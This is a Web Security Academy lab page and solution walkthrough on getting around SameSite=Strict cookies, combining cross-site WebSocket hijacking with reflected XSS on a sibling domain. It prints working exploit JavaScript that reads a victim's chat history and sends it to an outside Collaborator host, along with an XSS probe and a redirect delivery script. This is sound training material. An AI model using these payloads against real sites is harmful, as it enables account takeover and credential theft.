# Lab: SameSite Strict bypass via sibling domain

Source: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
Fetched: 2026-06-28T09:17:46.385170+00:00

Web Security Academy

CSRF

Bypassing SameSite cookie restrictions

Lab

Lab: SameSite Strict bypass via sibling domain

This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

If you haven't done so already, we recommend completing our topic on WebSocket vulnerabilities before attempting this lab.

Hint

Make sure you fully audit all of the available attack surface. Keep an eye out for additional vulnerabilities that may help you to deliver your attack, and bear in mind that two domains can be located within the same site.

Solution

Study the live chat feature

In Burp's browser, go to the live chat feature and send a few messages.

In Burp, go to the Proxy > HTTP history tab and find the WebSocket handshake request. This should be the most recent GET /chat request.

Notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions.

In the browser, refresh the live chat page.

In Burp, go to the Proxy > WebSockets history tab. Notice that when you refresh the page, the browser sends a READY message to the server. This causes the server to respond with the entire chat history.

Confirm the CSWSH vulnerability

In Burp, go to the Collaborator tab and click Copy to clipboard. A new Collaborator payload is saved to your clipboard.

In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept:

<script>

var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

ws.onopen = function() {

ws.send("READY");

};

ws.onmessage = function(event) {

fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});

};

</script>

Store and view the exploit yourself

In Burp, go back to the Collaborator tab and click Poll now. Observe that you have received an HTTP interaction, which indicates that you've opened a new live chat connection with the target site.

Notice that although you've confirmed the CSWSH vulnerability, you've only exfiltrated the chat history for a brand new session, which isn't particularly useful.

Go to the Proxy > HTTP history tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent GET /chat request.

Notice that your session cookie was not sent with the request.

In the response, notice that the website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests.

Identify an additional vulnerability in the same "site"

In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an Access-Control-Allow-Origin header, which reveals a sibling domain at cms-YOUR-LAB-ID.web-security-academy.net.

In the browser, visit this new URL to discover an additional login form.

Submit some arbitrary login credentials and observe that the username is reflected in the response in the Invalid username message.

Try injecting an XSS payload via the username parameter, for example:

<script>alert(1)</script>

Observe that the alert(1) is called, confirming that this is a viable reflected XSS vector.

Send the POST /login request containing the XSS payload to Burp Repeater.

In Burp Repeater, right-click on the request and select Change request method to convert the method to GET. Confirm that it still receives the same response.

Right-click on the request again and select Copy URL. Visit this URL in the browser and confirm that you can still trigger the XSS. As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being mitigated by SameSite restrictions.

Bypass the SameSite restrictions

Recreate the CSWSH script that you tested on the exploit server earlier.

<script>

var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

ws.onopen = function() {

ws.send("READY");

};

ws.onmessage = function(event) {

fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});

};

</script>

URL encode the entire script.

Go back to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested, but use the URL-encoded CSWSH payload as the username parameter. The following is one possible approach:

<script>

document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";

</script>

Store and view the exploit yourself.

In Burp, go back to the Collaborator tab and click Poll now. Observe that you've received a number of new interactions, which contain your entire chat history.

Go to the Proxy > HTTP history tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent GET /chat request.

Confirm that this request does contain your session cookie. As it was initiated from the vulnerable sibling domain, the browser considers this a same-site request.

Deliver the exploit chain

Go back to the exploit server and deliver the exploit to the victim.

In Burp, go back to the Collaborator tab and click Poll now.

Observe that you've received a number of new interactions.

Study the HTTP interactions and notice that these contain the victim's chat history.

Find a message containing the victim's username and password.

Use the newly obtained credentials to log in to the victim's account and the lab is solved.

Community solutions

Jarno Timmermans

Find CSRF vulnerabilities using Burp Suite

Try for free
